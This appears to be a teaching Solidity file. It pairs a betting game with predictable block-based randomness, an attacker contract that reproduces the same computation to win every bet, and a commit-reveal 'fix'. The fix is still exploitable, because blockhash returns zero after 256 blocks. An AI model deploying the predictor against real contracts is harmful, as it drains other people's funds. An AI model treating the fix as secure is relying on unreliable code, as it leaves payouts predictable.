// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableRandomGame {
    function fund() external payable {}

    function betOnEven(bool guessEven) external payable {
        require(msg.value == 1 ether, "bet must be 1 ether");

        uint256 randomValue = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 2;
        bool actualEven = randomValue == 0;

        if (actualEven == guessEven) {
            (bool success,) = payable(msg.sender).call{value: 2 ether}("");
            require(success, "payout failed");
        }
    }
}

contract RandomnessPredictor {
    VulnerableRandomGame public immutable target;

    constructor(address targetAddress) {
        target = VulnerableRandomGame(targetAddress);
    }

    function attack() external payable {
        require(msg.value == 1 ether, "bet must be 1 ether");

        uint256 randomValue = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 2;
        bool guessEven = randomValue == 0;

        target.betOnEven{value: msg.value}(guessEven);
    }

    receive() external payable {}
}

contract FixedCommitRevealGame {
    struct Bet {
        bytes32 commitment;
        uint256 amount;
        uint256 commitBlock;
    }

    mapping(address => Bet) public bets;

    function fund() external payable {}

    function commitBet(bytes32 commitment) external payable {
        require(msg.value == 1 ether, "bet must be 1 ether");
        require(bets[msg.sender].amount == 0, "active bet exists");

        bets[msg.sender] = Bet({commitment: commitment, amount: msg.value, commitBlock: block.number});
    }

    function reveal(bool guessEven, bytes32 salt) external {
        Bet memory bet = bets[msg.sender];
        require(bet.amount == 1 ether, "no active bet");
        require(block.number > bet.commitBlock, "reveal later");
        require(keccak256(abi.encodePacked(guessEven, salt)) == bet.commitment, "bad reveal");

        delete bets[msg.sender];

        uint256 randomValue = uint256(keccak256(abi.encodePacked(blockhash(bet.commitBlock), msg.sender, salt))) % 2;
        bool actualEven = randomValue == 0;

        if (actualEven == guessEven) {
            (bool success,) = payable(msg.sender).call{value: 2 ether}("");
            require(success, "payout failed");
        }
    }
}
